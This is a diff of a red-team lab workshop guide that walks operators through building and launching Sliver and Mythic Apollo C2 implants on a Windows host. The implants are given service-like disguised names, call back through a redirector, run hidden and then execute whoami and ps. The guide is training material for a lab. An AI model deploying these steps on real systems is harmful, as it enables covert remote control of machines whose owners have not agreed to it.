@@ -45,7 +45,7 @@ Sliver drives the attack in ATTACK, so it is set up first and in the most depth.
 
 ### Step A1. Open the Sliver host
 
-From the Windows operator, use the MobaXterm **Sliver (SSH)** bookmark under the redStack Lab session folder. Guacamole > Sliver (SSH) also works; MobaXterm is preferred for its built-in SFTP panel, used in Step A4.
+From the Windows operator, use the MobaXterm **Sliver (SSH)** bookmark under the redStack Lab session folder. Guacamole > Sliver (SSH) also works though MobaXterm is preferred.
 
 Success: you land at `admin@sliver:~$`.
 
@@ -57,7 +57,7 @@ If it fails: Sliver has no public IP; both paths route through the internal VPC.
 sliver-client
 ```
 
-The pre-installed `admin.cfg` loads automatically; you land at `sliver >` within a couple seconds.
+The pre-installed `admin.cfg` loads automatically; you land at `sliver >` within a couple seconds. You may have to hit enter to get the sliver prompt. 
 
 First session per deployment only, import the profile (Sliver persists it afterward):
 
@@ -81,6 +81,8 @@ If it fails: "profile with name 'redstack' already exists" is expected on reconn
 
 ### Step A3. Generate the implant
 
+**Be sure to replace the `<REDIR_PUBLIC_IP>` with your actual redirector IP that can be found in `deployment_info.txt`.**
+
 ```text
 generate --http https://<REDIR_PUBLIC_IP>/cloud/storage/objects/ --os windows --arch amd64 --format exe --c2profile redstack --save /tmp/sysProxy.exe
 ```
@@ -92,6 +94,8 @@ This is the only Sliver implant you build all workshop. It stays at `/tmp/sysPro
 Success: `[*] Implant saved to /tmp/sysProxy.exe`.
 
 If it fails: SSH hang during generate points at an undersized instance (see Step A1). If it compiles but is owned by root and cannot be pulled, the umask override is missing (`/etc/systemd/system/sliver.service.d/umask.conf`).
+
+**While waiting for this to finish, lets skip ahead and get logged into Mythic>Step B1**
 
 ### Step A4. Transfer to Windows and execute
 
@@ -134,31 +138,36 @@ Mythic ships with the HTTP profile and Apollo agent pre-installed, the token pre
 
 ### Step B1. Log in and build the Apollo payload
 
-From the Windows operator (Guacamole RDP), open Chromium to `https://mythic:7443` and log in as `mythic_admin` / `<LAB_PASSWORD>`. If the portal will not load or the `http` profile is not accepting connections, see the wiki Mythic > Troubleshooting.
+From the Windows operator (Guacamole RDP), open Chromium to `https://mythic:7443` (or click on the Mythic C2 bookmark) and log in as `mythic_admin` / `<LAB_PASSWORD>`. If the portal will not load or the `http` profile is not accepting connections, see the wiki Mythic > Troubleshooting.
 
 Left sidebar > **Create Payload**. The builder walks you through four sections in order:
 
 1. **Select OS** — choose `Windows`.
 2. **Select Payload** — choose `Apollo`. A **Continue from Existing Payload / Start Fresh** toggle appears; select **Start Fresh**.
-3. **Build Parameters** — set `Output Format` to `WinExe`.
+3. **Build Parameters** — set `Output Format` to `WinExe` and click next.
 4. **Commands** — keep the default set (`shell`, `ps`, `run`, `upload`) and add `whoami`.
-	1. Find `whoami` on the left side, toggle it, and pres the single arrow `>` to add it to the payload build.
+	1. Find `whoami` on the left side, toggle it, and press the single arrow `>` to add it to the payload build. Click next.
 5. **C2 Profiles** — pick `http`, click **+ INCLUDE PROFILE**.
 
 On the `http` profile, set only these fields, in the order they appear in the UI. Leave everything else (encryption, kill date, and so on) at its default:
 
-| Field             | Value                                                                                                                                                                                             |
-| ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| callback_host     | `https://<REDIR_PUBLIC_IP>`                                                                                                                                                                       |
-| callback_interval | `2` (seconds; fast cadence for demo visibility)                                                                                                                                                   |
-| callback_jitter   | `20` (percent)                                                                                                                                                                                    |
-| callback_port     | `443`                                                                                                                                                                                             |
-| headers           | Add a new header: delete the default `Host` header. <br>KEY input `X-Request-ID`<br>VALUE: input the token from `deployment_info.txt` (the `X-Request-ID` line). Do not type `<TOKEN>` literally. |
-| post_uri          | `cdn/media/stream/update` (no leading `/`)                                                                                                                                                        |
+| Field             | Value                                                                                                                                                                                                                      |
+| ----------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| callback_host     | `https://<REDIR_PUBLIC_IP>`                                                                                                                                                                                                |
+| callback_interval | `2` (seconds; fast cadence for demo visibility)                                                                                                                                                                            |
+| callback_jitter   | `20` (percent)                                                                                                                                                                                                             |
+| callback_port     | `443`                                                                                                                                                                                                                      |
+| headers           | 1. Add a new header: delete the default `Host` text in the new header. <br>2. KEY input `X-Request-ID`<br>3. VALUE: input the token from `deployment_info.txt` (the `X-Request-ID` line). Do not type `<TOKEN>` literally. |
+| post_uri          | 1. Remove the default `data`<br>2. Input `cdn/media/stream/update` (with no leading `/`)                                                                                                                                   |
+Once all values are accurate, click `Next`.
 
 The `http` profile already carries a default User-Agent (browser-fingerprint) header; leave it. The default `Host` header, however, must be deleted, or the redirector sees the wrong Host and the callback never lands.
 
-Name the payload `msDiag.exe` (service-like, m = Mythic) and click Create Payload. It lands in `C:\Users\Administrator\Downloads\`; move it to the Desktop so it launches next to the other beacons:
+Name the payload `msDiag.exe` (service-like, m = Mythic) and click **Create Payload**. 
+
+**While it is building, go ahead and return back to our Sliver beacon and move it to the Windows Desktop Step A4.** 
+
+Once the Mythic Apollo agent finishes building click on download and it lands in `C:\Users\Administrator\Downloads\`; move it to the Desktop so it launches next to the other beacons:
 
 ```powershell
 Move-Item C:\Users\Administrator\Downloads\msDiag.exe C:\Users\Administrator\Desktop\
@@ -171,6 +180,7 @@ From PowerShell on the Windows host:
 ```powershell
 Start-Process -FilePath "C:\Users\Administrator\Desktop\msDiag.exe" -WindowStyle Hidden
 ```
+**Note: You can also double-click on the icon in the desktop, but then it creates a process window that has to remain open or the beacon will loose session.** 
 
 In the Mythic UI, open Active Callbacks (phone icon). A `windows` / Administrator row appears within a few seconds. Open its tasking pane and run:
 
@@ -179,6 +189,12 @@ whoami
 ```
 
 Success: the callback registers and `whoami` returns `windows\administrator`. Leave the callback active as the Mythic heartbeat.
+
+```text
+ps
+```
+
+Success: the implant shows the processes running on the host. 
 
 If it fails: see the wiki Mythic > Troubleshooting > "Callback never arrives" (listener, network path via redirector curl test, build params header/`post_uri`, Defender).
 
